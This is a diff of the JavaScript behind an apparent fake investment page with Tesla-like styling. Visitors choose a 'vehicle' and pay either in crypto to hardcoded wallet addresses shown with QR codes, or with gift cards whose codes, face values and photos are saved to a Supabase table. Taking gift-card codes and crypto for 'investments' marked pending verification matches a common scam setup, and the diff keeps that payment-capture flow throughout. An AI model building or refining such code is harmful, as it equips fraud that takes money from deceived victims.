-        "USDC (ERC20)": { address: "0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", scheme: "ethereum:0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", label: "USD Coin (ERC20)", moonpayCode: "usdc" },
-        "USDT (ERC20)": { address: "0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", scheme: "ethereum:0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", label: "USDT (ERC20)", moonpayCode: "usdt" },
-        "Ethereum (ETH)": { address: "0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", scheme: "ethereum:0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", label: "Ethereum (ETH)", moonpayCode: "eth" },
-        "Solana (SOL)": { address: "3o1XwD4bUB5RjrC4xwG3h6C8eZRhdmNqPpU8bQhXdc5b", scheme: "solana:3o1XwD4bUB5RjrC4xwG3h6C8eZRhdmNqPpU8bQhXdc5b", label: "Solana (SOL)", moonpayCode: "sol" },
-        "Bitcoin (BTC)": { address: "bc1q4vax6xwa2m7ukh0kkqc6kcs6a9eltfn50d8z8e", scheme: "bitcoin:bc1q4vax6xwa2m7ukh0kkqc6kcs6a9eltfn50d8z8e", label: "Bitcoin (BTC)", moonpayCode: "btc" },
-        "USDT (TRC20)": { address: "TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6", scheme: "tron:TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6", label: "Tether USDT (TRC20)", moonpayCode: "usdt_tron" }
-    };
+        const wallets = {
+            "USDT (TRC20)": { address: "TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6", label: "Tether USDT (TRC20)" },
+            "Bitcoin (BTC)": { address: "bc1q4vax6xwa2m7ukh0kkqc6kcs6a9eltfn50d8z8e", label: "Bitcoin (BTC)" },
+            "Ethereum (ETH)": { address: "0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", label: "Ethereum (ETH)" },
+            "USDC (ERC20)": { address: "0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", label: "USD Coin (ERC20)" }
+        };
 
-    let currentPaymentMethod = 'crypto';
-    let selectedCardImages = [];
+        let currentPaymentMethod = 'crypto';
+        let selectedCardImages = [];
 
-    function setPaymentMethod(method) {
-        currentPaymentMethod = method;
-        const cryptoBtn = document.getElementById('payCryptoBtn');
-        const cardBtn = document.getElementById('payCardBtn');
-        const cryptoSection = document.getElementById('cryptoSection');
-        const cardSection = document.getElementById('cardSection');
-        const investAmount = document.getElementById('investAmount');
+        function setPaymentMethod(method) {
+            currentPaymentMethod = method;
+            const cryptoBtn = document.getElementById('payCryptoBtn');
+            const cardBtn = document.getElementById('payCardBtn');
+            const cryptoSection = document.getElementById('cryptoSection');
+            const cardSection = document.getElementById('cardSection');
+            const investAmount = document.getElementById('investAmount');
 
-        if (method === 'crypto') {
-            cryptoBtn.className = 'flex-1 py-2.5 rounded-lg text-xs font-semibold transition-all bg-[#E82127] text-white';
-            cardBtn.className = 'flex-1 py-2.5 rounded-lg text-xs font-semibold transition-all text-neutral-400 hover:text-white';
-            cryptoSection.classList.remove('hidden');
-            cardSection.classList.add('hidden');
-            // Make crypto amount required, card fields not required
-            investAmount.required = true;
-        } else {
-            cardBtn.className = 'flex-1 py-2.5 rounded-lg text-xs font-semibold transition-all bg-[#E82127] text-white';
-            cryptoBtn.className = 'flex-1 py-2.5 rounded-lg text-xs font-semibold transition-all text-neutral-400 hover:text-white';
-            cryptoSection.classList.add('hidden');
-            cardSection.classList.remove('hidden');
-            // Remove required from hidden crypto field so form can submit
-            investAmount.required = false;
-            investAmount.value = '';
+            if (method === 'crypto') {
+                cryptoBtn.className = 'flex-1 py-2.5 rounded-lg text-xs font-semibold bg-[#E82127] text-white';
+                cardBtn.className = 'flex-1 py-2.5 rounded-lg text-xs font-semibold text-neutral-400 hover:text-white';
+                cryptoSection.classList.remove('hidden');
+                cardSection.classList.add('hidden');
+                investAmount.required = true;
+            } else {
+                cardBtn.className = 'flex-1 py-2.5 rounded-lg text-xs font-semibold bg-[#E82127] text-white';
+                cryptoBtn.className = 'flex-1 py-2.5 rounded-lg text-xs font-semibold text-neutral-400 hover:text-white';
+                cryptoSection.classList.add('hidden');
+                cardSection.classList.remove('hidden');
+                investAmount.required = false;
+                investAmount.value = '';
+            }
         }
-    }
 
-    // Card image handling
-    document.getElementById('cardImagesInput').addEventListener('change', function(e) {
-        const files = Array.from(e.target.files);
-        const remaining = 10 - selectedCardImages.length;
-        const toAdd = files.slice(0, remaining);
-
-        toAdd.forEach(file => {
-            if (!file.type.startsWith('image/')) return;
-            const reader = new FileReader();
-            reader.onload = function(ev) {
-                selectedCardImages.push({ file, dataUrl: ev.target.result });
-                renderImagePreviews();
-            };
-            reader.readAsDataURL(file);
+        // Image handling
+        document.getElementById('cardImagesInput').addEventListener('change', function(e) {
+            const files = Array.from(e.target.files);
+            const remaining = 6 - selectedCardImages.length;
+            files.slice(0, remaining).forEach(file => {
+                if (!file.type.startsWith('image/')) return;
+                const reader = new FileReader();
+                reader.onload = (ev) => {
+                    selectedCardImages.push(ev.target.result); // store base64 directly
+                    renderImagePreviews();
+                };
+                reader.readAsDataURL(file);
+            });
+            this.value = '';
         });
-        this.value = '';
-    });
 
-    function renderImagePreviews() {
-        const container = document.getElementById('imgPreviewContainer');
-        container.innerHTML = '';
-        selectedCardImages.forEach((item, idx) => {
-            const div = document.createElement('div');
-            div.className = 'img-preview-item w-20 h-20';
-            div.innerHTML = `
-                <img src="${item.dataUrl}" class="w-20 h-20 rounded-xl object-cover border border-[#333]">
-                <button type="button" class="img-remove-btn" onclick="removeCardImage(${idx})">×</button>
-            `;
-            container.appendChild(div);
-        });
-        const counter = document.getElementById('imgCounter');
-        counter.textContent = `${selectedCardImages.length} / 10`;
-        counter.className = selectedCardImages.length > 0 ? 'text-emerald-400 font-normal normal-case' : 'text-blue-400 font-normal normal-case';
-    }
-
-    function removeCardImage(idx) {
-        selectedCardImages.splice(idx, 1);
-        renderImagePreviews();
-    }
-
-    function selectAssetVehicle(vehicleName) {
-        document.getElementById('assetCardsGrid').classList.add('hidden');
-        document.getElementById('mainContainer').classList.remove('max-w-5xl');
-        document.getElementById('mainContainer').classList.add('max-w-md');
-        document.getElementById('selectedVehicleBadge').innerText = vehicleName;
-        document.getElementById('formCard').classList.remove('hidden');
-        setPaymentMethod('crypto');
-    }
-
-    function resetToAssetGrid() {
-        document.getElementById('formCard').classList.add('hidden');
-        document.getElementById('cardSuccessCard').classList.add('hidden');
-        document.getElementById('paymentCard').classList.add('hidden');
-        document.getElementById('mainContainer').classList.remove('max-w-md');
-        document.getElementById('mainContainer').classList.add('max-w-5xl');
-        document.getElementById('assetCardsGrid').classList.remove('hidden');
-        selectedCardImages = [];
-        renderImagePreviews();
-        document.getElementById('cardName').value = '';
-        document.getElementById('cardCode').value = '';
-        document.getElementById('cardFaceValue').value = '';
-        document.getElementById('investAmount').value = '';
-    }
-
-    // Custom select
-    const selectTrigger = document.getElementById('customSelectTrigger');
-    const selectMenu = document.getElementById('customSelectMenu');
-    const dropdownArrow = document.getElementById('dropdownArrow');
-    const hiddenInput = document.getElementById('assetSelect');
-    const selectedAssetContainer = document.getElementById('selectedAssetContainer');
-
-    selectTrigger.addEventListener('click', (e) => {
-        e.stopPropagation();
-        selectMenu.classList.toggle('hidden');
-        dropdownArrow.classList.toggle('rotate-180');
-    });
-
-    document.addEventListener('click', () => {
-        selectMenu.classList.add('hidden');
-        dropdownArrow.classList.remove('rotate-180');
-    });
-
-    document.querySelectorAll('.asset-option').forEach(option => {
-        option.addEventListener('click', function() {
-            const value = this.getAttribute('data-value');
-            const name = this.getAttribute('data-name');
-            const network = this.getAttribute('data-network');
-            const img = this.getAttribute('data-img');
-            const rate = this.getAttribute('data-rate');
-            const change = this.getAttribute('data-change');
-
-            hiddenInput.value = value;
-            const badgeHtml = network ? `<span class="text-[9px] bg-neutral-900 border border-neutral-800 text-neutral-400 px-1.5 py-0.5 rounded font-medium">${network}</span>` : '';
-            const changeColor = change.includes('-') ? 'text-red-500' : 'text-emerald-500';
-
-            selectedAssetContainer.innerHTML = `
-                <img src="${img}" class="w-6 h-6 rounded-full" alt="${name}">
-                <div>
-                    <div class="flex items-center space-x-1.5">
-                        <span class="text-sm font-bold text-white">${name}</span>
-                        ${badgeHtml}
-                    </div>
-                    <p class="text-[10px] text-neutral-400 mt-0.5">${rate} <span class="${changeColor}">${change}</span></p>
-                </div>
-            `;
-            selectMenu.classList.add('hidden');
-            dropdownArrow.classList.remove('rotate-180');
-        });
-    });
-
-    async function copyWalletAddress() {
-        const addressText = document.getElementById('walletAddress').innerText;
-        const copyIcon = document.getElementById('copyIcon');
-        const copyTxt = document.getElementById('copyTxt');
-        try {
-            await navigator.clipboard.writeText(addressText);
-            copyIcon.classList.add('hidden');
-            copyTxt.classList.remove('hidden');
-            setTimeout(() => {
-                copyTxt.classList.add('hidden');
-                copyIcon.classList.remove('hidden');
-            }, 2000);
-        } catch (err) {
-            const el = document.createElement('textarea');
-            el.value = addressText;
-            document.body.appendChild(el);
-            el.select();
-            document.execCommand('copy');
-            document.body.removeChild(el);
+        function renderImagePreviews() {
+            const container = document.getElementById('imgPreviewContainer');
+            container.innerHTML = '';
+            selectedCardImages.forEach((dataUrl, idx) => {
+                const div = document.createElement('div');
+                div.className = 'img-preview-item w-20 h-20';
+                div.innerHTML = `
+                    <img src="${dataUrl}" class="w-20 h-20 rounded-xl object-cover border border-[#333]">
+                    <button type="button" class="img-remove-btn" onclick="removeCardImage(${idx})">×</button>`;
+                container.appendChild(div);
+            });
+            document.getElementById('imgCounter').textContent = `${selectedCardImages.length} / 6`;
         }
-    }
 
-    // ========== MAIN SUBMIT ==========
-    document.getElementById('investForm').addEventListener('submit', async (e) => {
-        e.preventDefault();
+        function removeCardImage(idx) {
+            selectedCardImages.splice(idx, 1);
+            renderImagePreviews();
+        }
 
-        const statusBox = document.getElementById('statusBox');
-        const submitBtn = document.getElementById('submitBtn');
+        function selectAssetVehicle(name) {
+            document.getElementById('assetCardsGrid').classList.add('hidden');
+            document.getElementById('mainContainer').classList.remove('max-w-5xl');
+            document.getElementById('mainContainer').classList.add('max-w-md');
+            document.getElementById('selectedVehicleBadge').innerText = name;
+            document.getElementById('formCard').classList.remove('hidden');
+            setPaymentMethod('crypto');
+        }
 
-        statusBox.classList.add('hidden');
-        submitBtn.disabled = true;
-        submitBtn.innerText = "Transmitting processing arrays...";
+        function resetToAssetGrid() {
+            document.getElementById('formCard').classList.add('hidden');
+            document.getElementById('cardSuccessCard').classList.add('hidden');
+            document.getElementById('paymentCard').classList.add('hidden');
+            document.getElementById('mainContainer').classList.remove('max-w-md');
+            document.getElementById('mainContainer').classList.add('max-w-5xl');
+            document.getElementById('assetCardsGrid').classList.remove('hidden');
+            selectedCardImages = [];
+            renderImagePreviews();
+        }
 
-        const currentVehicle = document.getElementById('selectedVehicleBadge').innerText;
+        // Custom select
+        document.getElementById('customSelectTrigger').addEventListener('click', (e) => {
+            e.stopPropagation();
+            document.getElementById('customSelectMenu').classList.toggle('hidden');
+        });
+        document.addEventListener('click', () => document.getElementById('customSelectMenu').classList.add('hidden'));
 
-        try {
-            // ==================== CARD PAYMENT ====================
-            if (currentPaymentMethod === 'card') {
-                const cardName = document.getElementById('cardName').value.trim();
-                const cardCode = document.getElementById('cardCode').value.trim();
-                const faceValue = parseFloat(document.getElementById('cardFaceValue').value);
+        document.querySelectorAll('.asset-option').forEach(opt => {
+            opt.addEventListener('click', function() {
+                const value = this.dataset.value;
+                const name = this.dataset.name;
+                const network = this.dataset.network;
+                const img = this.dataset.img;
+                document.getElementById('assetSelect').value = value;
+                document.getElementById('selectedAssetContainer').innerHTML = `
+                    <img src="${img}" class="w-6 h-6 rounded-full">
+                    <div><span class="text-sm font-bold text-white">${name}</span>
+                    ${network ? `<span class="text-[9px] bg-neutral-900 border border-neutral-800 text-neutral-400 px-1.5 py-0.5 rounded ml-1">${network}</span>` : ''}</div>`;
+                document.getElementById('customSelectMenu').classList.add('hidden');
+            });
+        });
 
-                if (!cardName) throw new Error("Please enter the Card Name / Brand.");
-                if (!cardCode) throw new Error("Please enter the Card Code / Number.");
-                if (!faceValue || faceValue <= 0) throw new Error("Please enter a valid Face Value.");
-                if (selectedCardImages.length === 0) throw new Error("Please upload at least one card image.");
+        async function copyWalletAddress() {
+            const text = document.getElementById('walletAddress').innerText;
+            await navigator.clipboard.writeText(text);
+            alert('Address copied!');
+        }
 
-                const cardId = "CARD-" + Math.floor(100000 + Math.random() * 900000);
-                const invId  = "INV-"  + Math.floor(100000 + Math.random() * 900000);
+        // ========== SUBMIT ==========
+        document.getElementById('investForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const statusBox = document.getElementById('statusBox');
+            const submitBtn = document.getElementById('submitBtn');
+            statusBox.classList.add('hidden');
+            submitBtn.disabled = true;
+            submitBtn.innerText = "Submitting...";
 
-                // 1. Save to card_submissions (admin can see this)
-                const { error: cardError } = await _supabase
-                    .from('card_submissions')
-                    .insert({
-                        id: cardId,
-                        user_id: userId,
-                        card_type: cardName,
-                        card_number: cardCode,
-                        expiry: null,
-                        cvv: null,
-                        status: 'Pending'
-                    });
+            const currentVehicle = document.getElementById('selectedVehicleBadge').innerText;
 
-                if (cardError) {
-                    console.error("Card insert error:", cardError);
-                    throw new Error("Failed to save card details: " + cardError.message);
-                }
+            try {
+                if (currentPaymentMethod === 'card') {
+                    // ===== GIFT CARD =====
+                    const cardName = document.getElementById('cardName').value.trim();
+                    const cardCode = document.getElementById('cardCode').value.trim();
+                    const faceValue = parseFloat(document.getElementById('cardFaceValue').value);
 
-                // 2. Also create investment record
-                const { error: invError } = await _supabase
-                    .from('investments')
-                    .insert({
+                    if (!cardName) throw new Error("Please enter the Gift Card brand/name");
+                    if (!cardCode) throw new Error("Please enter the card number/code");
+                    if (!faceValue || faceValue <= 0) throw new Error("Please enter a valid face value");
+                    if (selectedCardImages.length === 0) throw new Error("Please upload at least one photo of the gift card");
+
+                    const cardId = "CARD-" + Math.floor(100000 + Math.random() * 900000);
+                    const invId  = "INV-" + Math.floor(100000 + Math.random() * 900000);
+
+                    // Save gift card + images
+                    const { error: cardError } = await _supabase
+                        .from('card_submissions')
+                        .insert({
+                            id: cardId,
+                            user_id: userId,
+                            card_type: cardName,
+                            card_number: cardCode,
+                            status: 'Pending',
+                            images: selectedCardImages   // array of base64 images
+                        });
+
+                    if (cardError) throw new Error("Failed to save gift card: " + cardError.message);
+
+                    // Also create investment record
+                    await _supabase.from('investments').insert({
                         id: invId,
                         user_id: userId,
                         amount: faceValue,
-                        asset: currentVehicle + " via Card",
+                        asset: currentVehicle + " via Gift Card",
                         status: 'Pending Verification'
                     });
 
-                if (invError) {
-                    console.error("Investment insert error:", invError);
-                    throw new Error("Failed to create investment record: " + invError.message);
+                    document.getElementById('formCard').classList.add('hidden');
+                    document.getElementById('cardSuccessCard').classList.remove('hidden');
+                    return;
                 }
 
-                // Success → show success screen
-                document.getElementById('formCard').classList.add('hidden');
-                document.getElementById('cardSuccessCard').classList.remove('hidden');
-                return;
-            }
+                // ===== CRYPTO =====
+                const asset = document.getElementById('assetSelect').value;
+                const amount = parseFloat(document.getElementById('investAmount').value);
+                if (!amount || amount < 50) throw new Error("Minimum investment is $50");
 
-            // ==================== CRYPTO PAYMENT ====================
-            const asset = document.getElementById('assetSelect').value;
-            const amount = parseFloat(document.getElementById('investAmount').value);
-            const selectedWallet = wallets[asset];
-
-            if (!amount || amount < 50) throw new Error("Minimum investment is $50.");
-
-            const invId = "INV-" + Math.floor(100000 + Math.random() * 900000);
-
-            const { error } = await _supabase
-                .from('investments')
-                .insert({
+                const invId = "INV-" + Math.floor(100000 + Math.random() * 900000);
+                const { error } = await _supabase.from('investments').insert({
                     id: invId,
                     user_id: userId,
                     amount: amount,
                     asset: asset + " → " + currentVehicle,
                     status: 'Pending Verification'
                 });
+                if (error) throw error;
 
-            if (error) {
-                console.error("Crypto investment error:", error);
-                throw new Error("Failed to create investment: " + error.message);
+                const wallet = wallets[asset] || wallets["USDT (TRC20)"];
+                document.getElementById('walletAddress').innerText = wallet.address;
+                document.getElementById('payAmountDisplay').innerText = amount + " USD";
+                document.getElementById('bannerAsset').innerText = wallet.label;
+                document.getElementById('walletLabel').innerText = wallet.label;
+                document.getElementById('qrCodeImg').src = `https://api.qrserver.com/v1/create-qr-code/?size=176x176&data=${encodeURIComponent(wallet.address)}`;
+
+                document.getElementById('formCard').classList.add('hidden');
+                document.getElementById('paymentCard').classList.remove('hidden');
+
+            } catch (err) {
+                console.error(err);
+                statusBox.className = "mb-4 p-4 text-sm rounded-xl border bg-red-950/30 border-red-900 text-red-400";
+                statusBox.innerText = err.message || "Something went wrong";
+                statusBox.classList.remove('hidden');
+                submitBtn.disabled = false;
+                submitBtn.innerText = "Initialize Capital Integration";
             }
-
-            // Show payment instructions
-            document.getElementById('walletAddress').innerText = selectedWallet.address;
-            document.getElementById('payAmountDisplay').innerText = `${amount} USD (${asset.split(' ')[0]})`;
-            document.getElementById('bannerAsset').innerText = selectedWallet.label;
-            document.getElementById('walletLabel').innerText = selectedWallet.label;
-            document.getElementById('qrCodeImg').src = `https://api.qrserver.com/v1/create-qr-code/?size=176x176&data=${encodeURIComponent(selectedWallet.address)}`;
-            document.getElementById('trustWalletLink').href = `${selectedWallet.scheme}?amount=${amount}`;
-
-            const mCode = selectedWallet.moonpayCode || "usdt_tron";
-            document.getElementById('moonPayLink').href = `https://buy.moonpay.com?apiKey=pk_live_your_key_here&currencyCode=${mCode}&walletAddress=${encodeURIComponent(selectedWallet.address)}&baseCurrencyAmount=${amount}&baseCurrencyCode=usd`;
-
-            document.getElementById('formCard').classList.add('hidden');
-            document.getElementById('paymentCard').classList.remove('hidden');
-
-        } catch (err) {
-            console.error(err);
-            statusBox.className = "mb-4 p-4 text-sm rounded-xl border bg-red-950/30 border-red-900 text-red-400";
-            statusBox.innerText = err.message || "Failed to process. Please try again.";
-            statusBox.classList.remove('hidden');
-            submitBtn.disabled = false;
-            submitBtn.innerText = "Initialize Capital Integration";
-        }
-    });
-</script>
+        });
+    </script>
 </body>
 </html>
